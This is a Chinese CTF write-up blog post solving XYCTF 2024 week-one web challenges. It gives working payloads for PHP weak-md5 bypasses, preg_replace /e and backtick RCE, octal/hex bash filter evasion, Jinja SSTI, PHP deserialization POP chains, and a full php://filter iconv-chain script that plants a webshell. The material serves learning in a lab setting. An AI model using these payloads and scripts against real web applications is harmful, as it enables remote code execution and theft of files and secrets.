---
title: "XYCTF 2024 web week1 wp"
date: 2024-04-26 20:18
updated: 2024-04-26 20:18
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "PHP"
  - "Python"
description: "学校要期中考试所以只能写第一周的web了（电脑被收了 悲），当时牢大那个题容器坏了，后来拿手机勉强做了一下ezclass，ezRCE，信息课上偷偷打了ezSerialize和牢大（）），各位大佬们凑合着看吧 拿手机打了两道题，实在被手机端的操作整红温了（菜就多练），再加上那个手机端的wss更是雪上加"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18147817"
---
学校要期中考试所以只能写第一周的web了（电脑被收了 悲），当时牢大那个题容器坏了，后来拿手机勉强做了一下ezclass，ezRCE，信息课上偷偷打了ezSerialize和牢大（）），各位大佬们凑合着看吧

拿手机打了两道题，实在被手机端的操作整红温了（菜就多练），再加上那个手机端的wss更是雪上加霜，只能放弃后面的题了，望佬们轻点喷

整体WEB题目偏简单，这才好嘛，第一周的WEB题ak了，甚至我还有时间提前写wp

牢大那个题一开始容器坏了，这下真坠机了（不过后来又修好了）（））

这次有很多关于进制编码绕过的linux RCE，可能是oSthing对它情有独钟吧

**[web](https://www.cnblogs.com/LAMENTXU#1)**

-   [warm up](https://www.cnblogs.com/LAMENTXU#1.1)
-   [ezmake](https://www.cnblogs.com/LAMENTXU#1.2)
-   [ez?make](https://www.cnblogs.com/LAMENTXU#1.3)
-   [ezmd5](https://www.cnblogs.com/LAMENTXU#1.4)
-   [我是一个复读机](https://www.cnblogs.com/LAMENTXU#1.5)
-   [ezhttp](https://www.cnblogs.com/LAMENTXU#1.6)
-   [ezpop](https://www.cnblogs.com/LAMENTXU#1.7)
-   [ezclass](https://www.cnblogs.com/LAMENTXU#1.8)
-   [ezRCE](https://www.cnblogs.com/LAMENTXU#1.9)
-   [ezSerialize](https://www.cnblogs.com/LAMENTXU#1.10)
-   [牢牢记住，逝者为大](https://www.cnblogs.com/LAMENTXU#1.11)
-   [ezLFI(赛后复现)](https://www.cnblogs.com/LAMENTXU#1.12)

其他题我们先不管他，等我期中考完拿到电脑再做吧(￣▽￣)"

ps: wp的顺序是按照我的做题顺序来的

# WEB

## warm up

难度：热身

开容器直接代码糊脸：

```
<?php
include 'next.php';
highlight_file(__FILE__);
$XYCTF = "Warm up";
extract($_GET);

if (isset($_GET['val1']) && isset($_GET['val2']) && $_GET['val1'] != $_GET['val2'] && md5($_GET['val1']) == md5($_GET['val2'])) {
    echo "ez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if (isset($md5) && $md5 == md5($md5)) {
    echo "ezez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if ($XY == $XYCTF) {
    if ($XY != "XYCTF_550102591" && md5($XY) == md5("XYCTF_550102591")) {
        echo $level2;
    } else {
        die("什么情况,这么基础的md5做不来");
    }
} else {
    die("学这么久,传参不会传?");
}
```

观察代码发现有一个明显的extract($\_GET);一眼变量覆盖漏洞

第一个if代码块要求：

**get传参val1，val2，它们不相同但它们的MD5弱比较（==）返回真**

数组绕过，科学计数法也可以（懒）

```
GET：val1[]=a&val2[]=b
```

第二个if代码块要求：

**变量md5的MD5值与它本身弱比较（==）返回真**

由于有变量覆盖漏洞，所以直接GET传md5值就行

这里有个知识点就是0e215962017这个字符串的MD5是和它本身弱等于的（都是0e开头）

（不知道的其实可以直接开浏览器查或者chatgpt）

```
GET：md5=0e215962017 
```

第三个if代码块要求:

**变量XY弱等于变量XYCTF，且XY的值不等于XYCTF\_550102591，而它们的md5弱比较（==）返回真**

这里你可能会遇上整个ctf之旅的第一个卡点，但是不难发现XYCTF\_550102591其实是一个出题人特制的字符串

md5('XYCTF\_550102591') = '0E937920457786991080577371025051'

直接变量覆盖+科学计数法绕过

```
GET：XY=QNKCDZO&XYCTF=QNKCDZO // md5('QNKCDZO') = '0E830400451993494058024219903391' 
```

得到输出LLeeevvveeelll222.php，进入下一关

进入level2，又是代码糊脸：

```
<?php
highlight_file(__FILE__);
if (isset($_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval($_POST['a'])) {
    echo "操作你O.o";
    echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);  // 我可不会像别人一样设置10来个level
} else {
    die("有点汗流浃背");
}
```

看到注释直接感动哭了（bushi）

第一个if代码块要求：

**POST了一个变量a，它不包含数字，但intval($a)返回真**

intval参数如果是有内容的数组返回1，可以用这个特性操作它

```
POST：a[]=1 
```

然后就简单了，preg\_replace的RCE：/e 修正符使 preg\_replace() 将 replacement 参数当作 PHP 代码

```
GET：a=/test/e&b=system('cat /flag')&c="just test"
```

**最终payload**

```
LEVEL1:
GET: ?val1[]=a&val2[]=b&md5=0e215962017&XY=QNKCDZO&XYCTF=QNKCDZO
LEVEL2: 
GET: ?a=/test/e&b=system('cat /flag')&c="just test"
POST: a[]=1
```

总结：感谢来自oSthing的两百分O(∩\_∩)O

## ezmake

难度：热身

makefile里面可以用$(shell {cmd})执行命令，用cat查看flag就行（没错啥也没过滤）

这里贴上makefile.php代码过滤输入的那行(ls出来的)

```
if (preg_match('/\/|\n|\r|\;|\|/i', $cmd))
```

**最终payload**

```
$(shell cat flag)
```

总结：比warmup还简单，网上搜makefile现学现卖就行；而且这过滤是认真的嘛

## ez?make

难度："简单"

简单个jb，个人感觉是第一批题目里最难的，做到这里肃然起敬了

这题其实题目出了一点小问题，FLAG变量的值是./flag应该在同目录下，结果找了半天发现在根目录XD（后来修了）

_（我的解法很奇怪，大概率非预期，大佬们看完别笑了真的）_

过滤很严格，f,l,a,g,?,\*,/全给你扬了(还有别的)

_知识点1:反引号内的内容被当作bash执行_

到这里基本有思路了，就是\`\`的rce嘛

然后我就卡住了，这破题这也不让用那也不让用，期间我破防试着用了env看环境变量，结果不知道出题人怎么想的在环境变量里搞个GZCTF\_flag=no\_flag。搞得我以为是跟这个环境变量有关呢，在这里卡了半天

_知识点2:xxd编码（base64中含有'a'不能用）_

```
echo -n 'ls' | xxd -p  // 6c73
echo '6c73' | xxd -p -r // ls
```

所以

```
`echo '6c73' | xxd -p -r` // 执行ls
```

到这里，真正的折磨才开始

ls列出目录下的文件有：Makefile, makefile.php, index.html

FLAG 呢？！！ ......flag在根目录下

这还不简单？

```
echo -n 'cat /flag' | xxd -p  // 636174202f666c6167
```

我本来也以为结束了，但是'636174202f666c6167'这段字符串里含有'f'（含有f,l,a,g都不能用）!

后来看了一下，'/'这个字符被xxd转化之后是2f......

_知识点3:&&命令连接符_

很好，接下来只需要用&&来cd就行了

先cd进根目录，然后就可以直接用flag获取而不是/flag了

但是，但是怎么不用'/'回到根目录啊

_知识点4:直接cd后面不接参数会回到home目录，home目录的上级文件夹的上级文件夹就是根目录_

最后的最后，sort构造出来的字符串中含有'f'字符不能用（不信你可以试试），用less查看flag(cat也行)

**最终payload**

```
`echo 6364|xxd -p -r`&&`echo 6364202e2e|xxd -p -r` &&`echo 6364202e2e|xxd -p -r` &&`echo 6c65737320666c6167|xxd -p -r`
// cd && cd .. & cd .. & less flag
```

总结：你管这叫ez？

## ezmd5

难度：签到甚至是热身

巨简单，直接fastcoll碰撞两个一样的图片就拿flag了（图片不能太大否则报错）

直接创建一个一像素的图片拖到fastcoll里碰撞即可

一像素图片给佬们贴在这里了：[https://files.cnblogs.com/files/blogs/820580/一像素图片\_碰撞用.zip](https://files.cnblogs.com/files/blogs/820580/%E4%B8%80%E5%83%8F%E7%B4%A0%E5%9B%BE%E7%89%87_%E7%A2%B0%E6%92%9E%E7%94%A8.zip)

总结：最善良的一集，甚至是隔壁qsnctf的原题（好像crypto里那个factor1也是原题，只不过把平方改成立方了，难绷）

## 我是一个复读机

难度：简单

进去直接爆破密码

> 用户名：admin，密码：asdqwe

进去一个输入框，输入汉字有报错信息‘我只认识你说的英文，{（汉字之外的信息）}’

尝试xss发现有弹窗（输入img src=1 onclick="alert('xss');"两边记得加上尖括号）

cookie里没东西，但是一般_ctf里有xss的时候就优先考虑ssti_，不过{被过滤

注意到报错的时候有{}

这不就是白给的大括号吗？？？

联想到{{}}与{%%}相等而且没有过滤%

输入‘%7 \* 7%一’的时候由于有汉字‘一’所以进行报错，报错信息为‘我只认识你说的英文，{%7 \* 7%}’，触发漏洞输出‘我只认识你说的英文，49’

到这里基本上确诊为jinja的ssti了

发现过滤了下划线，引号等等，但没过滤request

显然得出payload

**最终payload**

```
GET:?a=__globals__&b=os&c=cat /flag&sentence=%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%一
```

## ezhttp

难度：签到

简单题，ez系列最诚实的两题之一（还有一个是ezmd5）

进去是一个登录框，注意到有robots.txt，里面有Disallow: /l0gin.txt，进l0gin.txt得到用户名密码

> username: XYCTF password: @JOILha!wuigqi123$

其他的知识点我放这了，佬们可以直接复制到http头里（记得去掉注释）

```
Referer: yuanshen.com // 从yuanshen.com来的
User-Agent: XYCTF // 用XYCTF浏览器
Client-IP: 127.0.0.1 // 本地用户，不用xff（X-Forward-For）
Via: ymzx.qq.com // 从ymzx.qq.com代理
Cookie: XYCTF // XYCTF的小饼干（Cookie）
```

总结：我也想吃XYCTF的小flag

## ezpop

难度：简单

首先看怎么利用

众所周知，strrev函数可以把字符串倒过来再输出

还是众所周知，implode函数可以将数组里的内容转为字符串

所以POST就可以提交

```
POST: a=implode&b=strrev
```

然后

```
c='metsys' // system倒过来 , d='cat /flag' 
```

得到

```
call_user_func(implode,内容为'strrev'的array)('metsys')('cat /flag');
```

等效于

```
strrev('metsys')('cat /flag')
```

等效于

```
system('cat /flag')
```

然后瞪眼法出链子（好短的链子）

```
<? php

...题目源码...

$c = new CCC();
$c -> c = new AAA();
$c -> c -> s = new BBB();
$c -> c -> a = 'hacku';
$c -> c -> s -> c = 'metsys';
$c -> c -> s -> d = 'cat /flag';
```

接下来绕过

```
throw new Exception("noooooob!!!");
```

NewStarCTF出过类似的题，直接用array($c, null)得到一个数组

```
a:2:{i:0;O:3:"CCC":1:{s:1:"c";O:3:"AAA":2:{s:1:"s";O:3:"CCC":2:{s:1:"c";s:6:"metsys";s:1:"d";s:9:"cat /flag";}s:1:"a";s:1:"c";}}i:1;N;} 
```

再把它改成一个非法数组，即最后一个1改成0

```
a:2:{i:0;O:3:"CCC":1:{s:1:"c";O:3:"AAA":2:{s:1:"s";O:3:"CCC":2:{s:1:"c";s:6:"metsys";s:1:"d";s:9:"cat /flag";}s:1:"a";s:1:"c";}}i:0;N;} // 最后一个1改成0 
```

即可在throw报错之前执行反序列化

exploit：

```
<? php

//题目源码放在这里

$c = new CCC();
$c -> c = new AAA();
$c -> c -> s = new BBB();
$c -> c -> a = 'hacku';
$c -> c -> s -> c = 'metsys';
$c -> c -> s -> d = 'cat /flag';
$exp = array($c, null);
echo serialize($exp);
```

再把输出的内容做如上文的修改即可

简单吧？提交payload之后就可以拿flag庆祝一下了

**最终payload**

```
  GET: ?xy=a:2:{i:0;O:3:%22CCC%22:1:{s:1:%22c%22;O:3:%22AAA%22:2:{s:1:%22s%22;O:3:%22BBB%22:2:> {s:1:%22c%22;s:6:%22metsys%22;s:1:%22d%22;s:9:%22cat%20/flag%22;}s:1:%22a%22;s:5:%22hacku%22;}}i:0;N;}
  POST: a=implode&b=strrev
```

总结：ezpop！但是构造那里挺新颖的，好题！

## ezclass

难度：签到

这题后来拿手机做的（打ctf上瘾了）但是手机那边的操作真的是给我搞红温了（尤其是wss的客户端我还得用termux下linux版的wss巨麻烦）最后只好找个签到难度的题做了（））

进来又是代码跳杀：

```
<?php
highlight_file(__FILE__);
$a=$_GET['a'];
$aa=$_GET['aa'];
$b=$_GET['b'];
$bb=$_GET['bb'];
$c=$_GET['c'];
((new $a($aa))->$c())((new $b($bb))->$c());
```

PHP里面有内置类，其中Error::getMessage方法可以返回Error类实例化时接受的字符串

可以看：[https://www.php.net/manual/zh/error.getmessage.php](https://www.php.net/manual/zh/error.getmessage.php)

所以基本思路就是创建两个error类分别给system和cat /flag两个参数，再用getMessage方法把输进去的参数当作字符串返回

示例：

```
GET: ?a=Error&aa=system&c=getMessage&b=Error&bb=ls
```

等同于：

```
((new Error('system'))->getMessage())((new $Error('ls'))->getMessage());
```

等同于：

```
system('ls')
```

构造payload拿到flag

**最终payload**

```
GET: ?a=Error&aa=system&c=getMessage&b=Error&bb=cat%20/flag
```

## ezRCE

难度：热身甚至是简单

进来又是代码跳杀

```
<?php
highlight_file(__FILE__);
function waf($cmd){
    $white_list = ['0','1','2','3','4','5','6','7','8','9','\\','\'','$','<']; 
    $cmd_char = str_split($cmd);
    foreach($cmd_char as $char){
        if (!in_array($char, $white_list)){
            die("really ez?");
        }
    }
    return $cmd;
}
$cmd=waf($_GET["cmd"]);
system($cmd);
really ez?
```

一眼无字母RCE，典中典了属于是，八进制绕过就好

_知识点：linux中使用$'xxx'（xxx为字符的八进制）的形式可以执行任意代码_

```
$'\154\163' //执行ls
```

发现可以成功执行

但是八进制的执行方法不能执行带有参数的linux命令，如cat /flag(/flag为参数)或ls -la(-la为参数)

具体原因参照bash的单词分割机制

但是出题人还是想给我们flag的，网开一面留了个'<'号

众所周知，重定向符号可以代替命令中的空格

所以payload就浮出水面啦！

**最终payload**

```
$'\143\141\164'<$'\57\146\154\141\147' // cat</flag
```

总结：如果对<的用法不太熟悉的话可能会出现很多相似的payload然后没有回显，那可太让人恶心了

## ezSerialize

pop链这种东西比较单一，一旦会了做起来很快的。如果你是小白的话不建议从这里开始学，我这里把exploit贴上就差不多得了我真不想写了（plzplzplz）

level1：

```
<?php
include 'flag.php';
highlight_file(__FILE__);
error_reporting(0);

class Flag {
    public $token;
    public $password;

    public function __construct($a, $b)
    {
        $this->token = $a;
        $this->password = $b;
    }

    public function login()
    {
        return $this->token === $this->password;
    }
}

if (isset($_GET['pop'])) {
    $pop = unserialize($_GET['pop']);
    $pop->token=md5(mt_rand());
    if($pop->login()) {
        echo $flag;
    }
}
```

哎呀这不ctfshow原题吗，一摸一样啊，就把类名改成Flag了有点抽象

[https://blog.csdn.net/Kracxi/article/details/122887126](https://blog.csdn.net/Kracxi/article/details/122887126)

我懒得写了（bushi）核心知识点就是用&让两个参数指向同一个地址，这样token变password跟着变

exploit:

```
<?php
class Flag{
    public $token;
    public $password;
    public function __construct(){
        $this->token='a';
        $this->password =&$this->token;
}
}
$a=new Flag();
echo urlencode(serialize($a));
```

提交给pop变量

payload:

```
GET：pop=O%3A4%3A"Flag"%3A2%3A%7Bs%3A5%3A"token"%3Bs%3A1%3A"a"%3Bs%3A8%3A"password"%3BR%3A2%3B%7D
```

进入fpclosefpclosefpcloseffflllaaaggg.php

level2:

看到还有level2有点难绷

```
<?php
highlight_file(__FILE__);
class A {
    public $mack;
    public function __invoke()
    {
        $this->mack->nonExistentMethod();
    }
}

class B {
    public $luo;
    public function __get($key){
        echo "o.O<br>";
        $function = $this->luo;
        return $function();
    }
}

class C {
    public $wang1;

    public function __call($wang1,$wang2)
    {
            include 'flag.php';
            echo $flag2;
    }
}

class D {
    public $lao;
    public $chen;
    public function __toString(){
        echo "O.o<br>";
        return is_null($this->lao->chen) ? "" : $this->lao->chen;
    }
}

class E {
    public $name = "xxxxx";
    public $num;

    public function __unserialize($data)
    {
        echo "<br>学到就是赚到!<br>";
        echo $data['num'];
    }
    public function __wakeup(){
        if($this->name!='' || $this->num!=''){
            echo "旅行者别忘记旅行的意义!<br>";
        }
    }
}

if (isset($_POST['pop'])) {
    unserialize($_POST['pop']);
}
```

又臭又长的pop链啊（悲）

exploit:

```
//题目源码放在这里
$e = new E();
$e -> num = new D();
$e -> name = '';
$e -> num -> lao = new B();
$e -> num -> chen = 'e';
$e -> num -> lao -> luo = new A();
$e -> num -> lao -> luo -> mack = new C();
$pop = serialize($e);
echo $pop;
```

把输出交上去就行

payload:

```
POST: pop=O:1:"E":2:{s:4:"name";s:0:"";s:3:"num";O:1:"D":2:{s:3:"lao";O:1:"B":1:{s:3:"luo";O:1:"A":1:{s:4:"mack";O:1:"C":1:{s:5:"wang1";N;}}}s:4:"chen";s:1:"e";}}
```

level2简简单单~~~

进入saber\_master\_saber\_master.php

level3:

```
<?php

error_reporting(0);
highlight_file(__FILE__);

// flag.php
class XYCTFNO1
{
    public $Liu;
    public $T1ng;
    private $upsw1ng;

    public function __construct($Liu, $T1ng, $upsw1ng = Showmaker)
    {
        $this->Liu = $Liu;
        $this->T1ng = $T1ng;
        $this->upsw1ng = $upsw1ng;
    }
}

class XYCTFNO2
{
    public $crypto0;
    public $adwa;

    public function __construct($crypto0, $adwa)
    {
        $this->crypto0 = $crypto0;
    }

    public function XYCTF()
    {
        if ($this->adwa->crypto0 != 'dev1l' or $this->adwa->T1ng != 'yuroandCMD258') {
            return False;
        } else {
            return True;
        }
    }
}

class XYCTFNO3
{
    public $KickyMu;
    public $fpclose;
    public $N1ght = "Crypto0";

    public function __construct($KickyMu, $fpclose)
    {
        $this->KickyMu = $KickyMu;
        $this->fpclose = $fpclose;
    }

    public function XY()
    {
        if ($this->N1ght == 'oSthing') {
            echo "WOW, You web is really good!!!\n";
            echo new $_POST['X']($_POST['Y']);
        }
    }

    public function __wakeup()
    {
        if ($this->KickyMu->XYCTF()) {
            $this->XY();
        }
    }
}

if (isset($_GET['CTF'])) {
    unserialize($_GET['CTF']);
}
```

跟上面一样构造链子

构造执行直接用php原生类SplFileObject读/flag就好

注意：有个private属性序列化时候前后要加上%00

```
GET：CTF=O:8:"XYCTFNO3":3:{s:7:"KickyMu";O:8:"XYCTFNO2":2:{s:7:"crypto0";s:0:"";s:4:"adwa";O:8:"XYCTFNO1":4:{s:3:"Liu";s:0:"";s:4:"T1ng";s:13:"yuroandCMD258";s:17:"%00XYCTFNO1%00upsw1ng";s:0:"";s:7:"crypto0";s:5:"dev1l";}}s:7:"fpclose";s:0:"";s:5:"N1ght";s:7:"oSthing";}
POST: X=SplFileObject&Y=php://filter/read=convert.base64-encode/resource=flag.php
```

然后base64解码就行

总结：最无聊的一集，但写题到最后被夸了（WOW, You web is really good!!!）开心捏

## 牢牢记住，逝者为大

孩子们，我回来了（信息课上写的哈哈哈哈哈）

```
<?php
highlight_file(__FILE__);
function Kobe($cmd)
{
    if (strlen($cmd) > 13) {
        die("see you again~");
    }
    if (preg_match("/echo|exec|eval|system|fputs|\.|\/|\\|/i", $cmd)) {
        die("肘死你");
    }
    foreach ($_GET as $val_name => $val_val) {
        if (preg_match("/bin|mv|cp|ls|\||f|a|l|\?|\*|\>/i", $val_val)) {
            return "what can i say";
        }
    }
    return $cmd;
}

$cmd = Kobe($_GET['cmd']);
echo "#man," . $cmd  . ",manba out";
echo "<br>";
eval("#man," . $cmd . ",mamba out");
```

_(1)cmd最长13个字符无法构造执行_

注意到没有过滤变量符号$，\[\]和\_（注意力惊人），构造变量逃逸cmd的长度限制

```
GET：cmd=eval($_GET[1])&1=system('echo hacku');
```

等效于

```
GET：cmd=eval(system('echo hacku'));
```

能有效缩短长度，并且将命令执行的关键词逃逸到变量1里绕过专门对cmd的限制（长度，关键词等等）

但是eval被过滤，加上长度限制，想到反引号RCE

```
GET：cmd=`$__GET[1]`;&1=system('echo hacku')
```

_(2)绕过#符号让eval里的代码被执行而不是被当作注释忽略_

没了?><?，但是%0a(换行符)一样可以越过#的限制，由此可得cmd里开头要有%0a

```
GET：cmd=%0a`$_GET[1]`;
```

_(3)排除掉',mamba out'的干扰_

直接以其治人之道还治其人之身，在cmd后面加#注释掉',mamba out'

%23为'#'的url编码，可得：

```
GET：cmd=%0a`$_GET[1]`;%23
```

_(4)绕过针对所有变量的过滤_

由于过滤了f所以不能用16进制绕过

直接转8进制

```
143 160 040 057 146 154 141 147 040 150 141 143 153 165 056 164 170 164 012 // cp /flag hacku.txt的8进制
```

_(5).RCE!!!_

$''里面加上8进制就行

```
cmd=%0a`$_GET[1]`;%23&1=$'\143\160'+$'\57\146\154\141\147'+$'\040\150\141\143\153\165\056\164\170\164\012'
```

总结：简单题，没过滤变量符号$和\[\]应该还算好意识到......吧，怎么总是感觉ctfshow出过这个题的样子

## ezLFI(赛后复现)

下载附件源码：

```
<?php include_once($_REQUEST['file']);
```

诶呀这不filter链嘛

贴别人的脚本秒了（））

```
import requests

#参数file
url = "http://localhost:51650/index.php"
file_to_use = "/etc/passwd"
command = "/readflag" #正常做题的话应该先是ls根目录发现有readflag文件并且flag无法直接通过cat读取，再用/readflag

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"
print(final_payload)
r = requests.get(url, params={
    "0": command,
    #"action": "include",
    "file": final_payload
})

print(r.text)
```

总结：这题只要听过知识点就是送，没听过就是折磨，感觉应该给新生多点引导吧

# 总结

整体题目还是比较简单的，只是这次比赛时间恰好跟我期中考试时间撞上了有点可惜

misc和reverse没做出来几道这里就不出来献丑了

总的来说是一次对小白比较友好地ctf比赛吧，毕竟大部分题目都直接是代码跳杀，确实学到了不少东西

唯一的问题是php太多了，希望下次多加点关于别的语言的内容（后来看了一下baby\_unserialize好像是沟槽的Java反序列化，但还是有点少了）

还有一个很奇妙的现象是：ezclass的难度比牢大要简单多了，但是解出少了一半，盲猜是因为比赛的时候网上挂wp的没做出来（））

哦对闲鱼还有卖flag的哈哈哈哈哈哈，真的差不多得了，web就解出来六道还都是巨简单的题目也好意思卖也是绝

HAPPY XYCTF2024!
